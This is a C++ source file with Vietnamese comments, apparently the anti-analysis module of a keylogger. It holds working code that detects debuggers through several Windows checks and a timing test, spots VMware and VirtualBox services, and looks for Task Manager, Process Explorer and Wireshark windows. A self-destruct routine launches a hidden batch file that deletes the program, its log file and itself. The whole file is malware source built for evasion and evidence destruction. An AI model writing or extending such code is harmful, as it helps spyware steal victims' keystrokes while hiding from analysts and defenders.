#include "../antidebug.h"
#include <shellapi.h> 

bool IsBeingDebugged() {
    // Kiểm tra debugger hiện diện
    if (IsDebuggerPresent())
        return true;

    // Kiểm tra debugger gián tiếp
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged)
        return true;

    // Kiểm tra ProcessDebugPort
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)
            GetProcAddress(hNtdll, "NtQueryInformationProcess");

        if (NtQueryInformationProcess) {
            DWORD debugPort = 0;
            NTSTATUS status = NtQueryInformationProcess(
                GetCurrentProcess(),
                ProcessDebugPort,
                &debugPort,
                sizeof(debugPort),
                NULL);

            if (NT_SUCCESS(status) && debugPort != 0)
                return true;
        }
    }

    // Kiểm tra thời gian thực thi (phát hiện breakpoint)
    ULONGLONG startTime = GetTickCount64();
    for (volatile int i = 0; i < 1000000; i++);
    ULONGLONG endTime = GetTickCount64();

    if (endTime - startTime > 500)  // Ngưỡng thời gian bất thường
        return true;

    return false;
}

bool IsRunningInVM() {
    // Kiểm tra một số dấu hiệu VM phổ biến
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // Kiểm tra số lượng processor thấp (thường thấy trong VM)
    if (sysInfo.dwNumberOfProcessors < 2)
        return true;

    // Kiểm tra một số service VM phổ biến
    SC_HANDLE scmHandle = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (scmHandle) {
        const char* vmServices[] = {
            "VMwareService", "Vmhgfs", "VMMEMCTL", "Vmmouse", "Vmrawdsk",
            "Vmusbmouse", "Vmvss", "Vmscsi", "Vmxnet", "vmx_svga",
            "VBoxService", "VBoxMouse", "VBoxGuest"
        };

        for (const char* service : vmServices) {
            SC_HANDLE serviceHandle = OpenServiceA(scmHandle, service, SERVICE_QUERY_STATUS);
            if (serviceHandle) {
                CloseServiceHandle(serviceHandle);
                CloseServiceHandle(scmHandle);
                return true;
            }
        }

        CloseServiceHandle(scmHandle);
    }

    return false;
}

bool IsBeingMonitored() {
    // Kiểm tra Task Manager
    HWND taskManager = FindWindowA("TaskManagerWindow", NULL);
    if (taskManager != NULL && IsWindowVisible(taskManager)) {
        return true;
    }

    // Kiểm tra Process Explorer
    HWND procExp = FindWindowA("PROCEXPL", NULL);
    if (procExp != NULL && IsWindowVisible(procExp)) {
        return true;
    }

    // Kiểm tra Wireshark hoặc các công cụ phân tích mạng
    HWND wireshark = FindWindowA("Qt5QWindowIcon", NULL);
    if (wireshark != NULL) {
        char buffer[256] = { 0 };
        GetWindowTextA(wireshark, buffer, sizeof(buffer));
        if (strstr(buffer, "Wireshark") != NULL) {
            return true;
        }
    }

    return false;
}

void SelfDestruct() {
    // Xóa file keylogger
    char moduleFileName[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, moduleFileName, MAX_PATH);

    // Tạo batch file tự hủy
    char tempPath[MAX_PATH] = { 0 };
    GetTempPathA(MAX_PATH, tempPath);
    std::string batchFile = std::string(tempPath) + "cleanup.bat";

    std::ofstream batch(batchFile);
    if (batch.is_open()) {
        batch << "@echo off" << std::endl;
        batch << "ping 127.0.0.1 -n 3 > nul" << std::endl;  // Đợi 3 giây
        batch << "del \"" << moduleFileName << "\"" << std::endl;
        batch << "del \"" << logFile << "\"" << std::endl;
        batch << "del \"%~f0\"" << std::endl;  // Tự xóa batch file
        batch.close();

        // Thực thi batch file
        ShellExecuteA(NULL, "open", batchFile.c_str(), NULL, NULL, SW_HIDE);
    }

    // Kết thúc chương trình
    ExitProcess(0);
}